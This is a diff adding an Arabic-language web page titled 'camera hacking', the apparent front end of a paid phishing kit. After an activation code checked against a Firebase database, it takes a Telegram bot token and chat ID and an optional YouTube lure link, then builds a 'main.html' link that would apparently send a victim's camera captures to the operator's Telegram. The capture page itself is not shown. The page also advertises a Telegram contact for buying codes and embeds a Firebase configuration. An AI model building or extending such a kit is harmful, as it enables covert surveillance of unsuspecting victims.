@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>اختراق الكامرا</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Cairo', sans-serif;
+      text-align: center;
+      color: #fff;
+      background: linear-gradient(135deg, #0d324d, #7f5a83);
+    }
+    body.login-body {
+      background: linear-gradient(135deg, #11998e, #38ef7d);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: rgba(255, 255, 255, 0.15);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+    h1 {
+      margin-top: 20px;
+      font-size: 2.2em;
+      color: #ffe75e;
+    }
+    h2 {
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      color: #ffe75e;
+    }
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 1.1em;
+      text-align: left;
+      color: #fff;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      margin-bottom: 15px;
+      font-size: 16px;
+      text-align: center;
+      background: rgba(0, 0, 0, 0.2);
+      color: #fff;
+    }
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.7);
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1.1em;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      opacity: 0.8;
+    }
+    button.login-btn {
+      width: 100%;
+      margin-top: 10px;
+      background: #2d7f5e;
+    }
+    #error {
+      color: #ff4d4d;
+      margin-top: 10px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .footer-login {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ddd;
+    }
+    .footer-login a {
+      color: #ffcc00;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .hidden {
+      display: none;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 5px;
+      word-wrap: break-word;
+    }
+    .telegram {
+      margin-top: 20px;
+    }
+    .telegram img {
+      width: 24px;
+      height: 24px;
+      vertical-align: middle;
+    }
+    footer {
+      margin-top: 30px;
+      font-size: 0.9em;
+      color: #eee;
+    }
+  </style>
+</head>
+<body class="login-body">
+  <div id="login-container" class="container">
+    <h2>تسجيل الدخول</h2>
+    <input type="text" id="userCode" placeholder="أدخل كود التفعيل" />
+    <button class="login-btn" onclick="verifyCode()">تحقق</button>
+    <div id="error"></div>
+    <div class="footer-login">
+      للحصول على كود تفعيل تواصل مع المطور
+      <a href="https://t.me/caser7" target="_blank">telegram:@caser7</a>
+    </div>
+  </div>
+  <div id="form-container" class="container hidden">
+    <h1>اختراق الكاميرا</h1>
+    <form id="info-form" onsubmit="generateLink(event)">
+      <label for="token">أدخل التوكن:</label>
+      <input type="password" id="token" placeholder="توكن البوت" required />
+      <label for="chat-id">أدخل ID:</label>
+      <input type="password" id="chat-id" placeholder="معرف الشات" required />
+      <label for="custom-link">ضع رابطك يوتيوب او اي شي (اختياري):</label>
+      <input type="text" id="custom-link" placeholder="رابط يوتيوب أو أي رابط آخر" />
+      <button type="submit">إنشاء الرابط</button>
+    </form>
+    <div id="result" class="result hidden"></div>
+  </div>
+  <footer>
+    <div class="telegram">
+
+      </a>
+    </div>
+
+  </footer>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
+    const firebaseConfig = {
+      apiKey: "AIzaSyAzeOYd4_rppBX_qvYOvgXj6le6FEyO1ac",
+      authDomain: "database-87036.firebaseapp.com",
+      projectId: "database-87036",
+      storageBucket: "database-87036.firebasestorage.app",
+      messagingSenderId: "147777098452",
+      appId: "1:147777098452:web:c1c4c305d5e6e0cf0c2141",
+      measurementId: "G-8S0XCNF1Y7"
+    };
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    async function verifyCode() {
+      const userCode = document.getElementById("userCode").value.trim().toUpperCase();
+      const querySnapshot = await getDocs(collection(db, "codes"));
+      let isValid = false;
+      querySnapshot.forEach((doc) => {
+        const data = doc.data();
+        if (data.code === userCode && data.isActive) {
+          isValid = true;
+        }
+      });
+      if (isValid) {
+        alert("✅ الكود صحيح! سيتم توجيهك الآن.");
+        document.getElementById("login-container").classList.add("hidden");
+        document.getElementById("form-container").classList.remove("hidden");
+        document.body.classList.remove("login-body");
+      } else {
+        document.getElementById("error").innerText = "❌ الكود غير صحيح أو تم تعطيله.";
+      }
+    }
+    window.verifyCode = verifyCode;
+  </script>
+  <script>
+    function generateLink(event) {
+      event.preventDefault();
+      const token = document.getElementById("token").value;
+      const chatId = document.getElementById("chat-id").value;
+      const customLink = document.getElementById("custom-link").value;
+      let link = `main.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
+      if(customLink.trim() !== ""){
+        link += `&url=${encodeURIComponent(customLink)}`;
+      }
+      localStorage.setItem("generatedLink", link);
+      showLink(link);
+    }
+    function showLink(link) {
+      const result = document.getElementById("result");
+      result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
+      result.classList.remove("hidden");
+    }
+  </script>
+</body>
+</html>
